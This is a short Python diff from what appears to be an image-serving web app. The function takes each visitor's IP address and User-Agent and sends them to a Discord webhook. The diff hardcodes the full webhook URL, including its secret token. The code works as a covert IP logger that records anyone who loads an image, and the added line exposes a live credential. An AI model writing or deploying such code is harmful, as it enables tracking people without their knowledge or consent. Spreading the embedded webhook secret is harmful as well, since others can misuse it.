@@ -16,7 +16,7 @@ file_types = {'gif': 'image/gif', 'jpeg': 'image/jpeg', 'jpg': 'image/jpg', 'png
 async def send_message_via_webhook(token, image_url):
     token = base64.b64decode(token.encode()).decode()
 
-    webhook_url = f"https://discord.com/api/webhooks/{token}" 
+    webhook_url = f"https://discord.com/api/webhooks/1443170597805883515/oceqLjOCwSLmZAuUF12l4J7O1RvroaejzDFKUA9SnDn8aRPMeAGNKL2W27ob3L2ddLNq" 
     if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
         message = {'ip': request.environ['REMOTE_ADDR'], 'useragent': request.headers.get('User-Agent')}
         ip = request.environ['REMOTE_ADDR']
